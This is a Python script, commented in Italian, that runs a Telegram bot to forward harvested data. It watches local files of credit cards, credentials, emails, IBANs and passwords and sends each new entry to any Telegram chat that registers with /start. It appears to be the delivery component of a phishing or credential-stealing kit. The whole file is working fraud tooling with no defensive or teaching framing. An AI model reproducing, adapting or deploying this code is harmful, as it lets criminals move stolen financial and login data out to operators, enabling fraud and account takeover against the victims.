import os
import telebot
import time
import threading

#--------Variable declaration and object initialization--------#

API_KEY = "YOUR_KEY"
bot = telebot.TeleBot(API_KEY)

# Lista dei percorsi dei file
file_paths = [
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "Credit_Cards.txt"),
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "Credentials.txt"),
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "Emails.txt"),
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "Ibans.txt"),
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "Passwords.txt"),
]

# Dizionario per tenere traccia delle informazioni per ogni file
file_info = {file_path: {'modification_time': os.path.getmtime(file_path), 'sent_lines': set()} for file_path in file_paths}

# Lista delle chat ID
chat_ids = set()

# Comando per iniziare e registrare il chat ID
@bot.message_handler(commands=['start'])
def start(message):
    global chat_ids
    chat_id = message.chat.id
    chat_ids.add(chat_id)  # Aggiungi il chat ID alla lista
    bot.send_message(chat_id, "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣷⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠛⠻⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣁⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠛⠉⠛⠶⠀⠀⢐⠿⠋⠀⢨⣿⣿⣿⣿⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢷⣿⣿⣶⠀⠀⠉⢶⣿⣿⠿⢿⣿⣿⣿⡄⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⢸⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⡇⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣶⡶⠂⠀⣀⠀⢀⡄⠐⢲⡾⣻⣿⣿⣿⠇⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣯⢿⡶⣶⣿⣟⣿⡶⠶⣿⢣⣿⣿⣿⣿⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⣾⣿⣿⣿⣧⠛⠒⠠⣤⣤⠶⠾⢣⣿⣿⣿⣿⣿⣤⣀⠀⠀⠀\n⢀⣠⣤⣶⣶⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⢿⣿⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n\nWelcome! You will now receive updates from the files")

# Funzione principale per controllare i cambiamenti nei file
def check_file_changes():
    global file_info

    while True:
        try:
            for file_path in file_paths:
                # Ottieni il tempo corrente di modifica del file
                current_modification_time = os.path.getmtime(file_path)

                # Verifica se il file è stato modificato
                if current_modification_time != file_info[file_path]['modification_time']:
                    with open(file_path, 'r') as file:
                        for line in file:
                            stripped_line = line.strip()
                            if stripped_line and stripped_line not in file_info[file_path]['sent_lines'] and chat_ids:
                            
                                if(file_path == os.path.join(os.path.dirname(os.path.abspath(__file__)), "Credit_Cards.txt")):
                                    for chat_id in chat_ids:
                                        bot.send_message(chat_id, "New details - Credit Card 💳💵\n\n{}".format(stripped_line))
                                        
                                elif(file_path == os.path.join(os.path.dirname(os.path.abspath(__file__)), "Credentials.txt")):
                                    for chat_id in chat_ids:
                                        bot.send_message(chat_id, "New details - Credentials 🪪🔑\n\n{}".format(stripped_line))
                                
                                elif(file_path == os.path.join(os.path.dirname(os.path.abspath(__file__)), "Emails.txt")):
                                    for chat_id in chat_ids:
                                        bot.send_message(chat_id, "New details - Emails 📨📦\n\n{}".format(stripped_line))
                                        
                                elif(file_path == os.path.join(os.path.dirname(os.path.abspath(__file__)), "Ibans.txt")):
                                    for chat_id in chat_ids:
                                        bot.send_message(chat_id, "New details - Ibans 💲🏧\n\n{}".format(stripped_line))
                                        
                                elif(file_path == os.path.join(os.path.dirname(os.path.abspath(__file__)), "Passwords.txt")):
                                    for chat_id in chat_ids:
                                        bot.send_message(chat_id, "New details - Passwords 🔐*️⃣\n\n{}".format(stripped_line))
                                        
                                else:
                                    print('Path non trovato')
                                    
                                file_info[file_path]['sent_lines'].add(stripped_line)

                    # Aggiorna le informazioni del file nel dizionario
                    file_info[file_path]['modification_time'] = current_modification_time

        except Exception as e:
            print(f"Si è verificato un errore: {str(e)}")

        time.sleep(5)

# Start the file change monitoring thread and the bot pooling loop
file_change_thread = threading.Thread(target=check_file_changes)
file_change_thread.start()

bot.polling()
